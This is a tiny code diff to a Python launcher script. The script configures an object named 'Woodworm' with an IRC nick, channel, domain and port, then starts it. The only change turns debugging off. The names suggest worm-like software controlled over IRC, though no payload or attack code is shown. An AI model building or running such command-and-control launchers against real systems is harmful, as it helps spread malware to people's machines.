@@ -8,4 +8,4 @@ if __name__ == "__main__":
     domain = "slaugh.pl"
     ircServerPort = 2000
     worm = woodworm.Woodworm(pathToFiles, ircNick, channel, domain, ircServerPort)
-    asyncio.run(worm.start()) 
+    asyncio.run(worm.start(debug=False)) 
